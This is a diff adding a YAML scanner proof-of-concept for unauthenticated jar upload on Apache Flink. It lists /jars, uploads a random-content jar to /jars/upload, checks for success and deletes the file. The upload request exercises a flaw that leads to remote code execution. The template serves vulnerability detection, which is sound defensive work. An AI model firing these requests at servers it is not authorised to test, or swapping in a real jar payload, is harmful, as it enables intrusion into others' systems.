@@ -1,0 +1,43 @@
+detail:
+  author: timwhite
+  links:
+  - https://github.com/LandGrey/flink-unauth-rce
+expression: r0() && r1() && r2()
+manual: true
+name: poc-yaml-apache-flink-upload-rce
+rules:
+  r0:
+    expression: response.status == 200 && response.content_type.contains("json") &&
+      response.body.bcontains(b"address") && response.body.bcontains(b"files")
+    request:
+      cache: true
+      follow_redirects: true
+      method: GET
+      path: /jars
+  r1:
+    expression: response.status == 200 && response.content_type.contains("json") &&
+      response.body.bcontains(b"success") && response.body.bcontains(bytes(r2))
+    output:
+      filen: search["filen"]
+      search: '"(?P<filen>([a-zA-Z0-9]{8}-[a-zA-Z0-9]{4}-[a-zA-Z0-9]{4}-[a-zA-Z0-9]{4}-[a-zA-Z0-9]{12}_[a-z]{4}.jar))".bsubmatch(response.body)'
+    request:
+      body: "--8ce4b16b22b58894aa86c421e8759df3\r\nContent-Disposition: form-data;\
+        \ name=\"jarfile\";filename=\"{{r2}}.jar\"\r\nContent-Type:application/octet-stream\r\
+        \n\r\n{{r1}}\r\n--8ce4b16b22b58894aa86c421e8759df3--\r\n"
+      cache: true
+      follow_redirects: true
+      headers:
+        Content-Type: multipart/form-data;boundary=8ce4b16b22b58894aa86c421e8759df3
+      method: POST
+      path: /jars/upload
+  r2:
+    expression: response.status == 200
+    request:
+      cache: true
+      follow_redirects: true
+      method: DELETE
+      path: /jars/{{filen}}
+set:
+  r1: randomLowercase(8)
+  r2: randomLowercase(4)
+transport: http
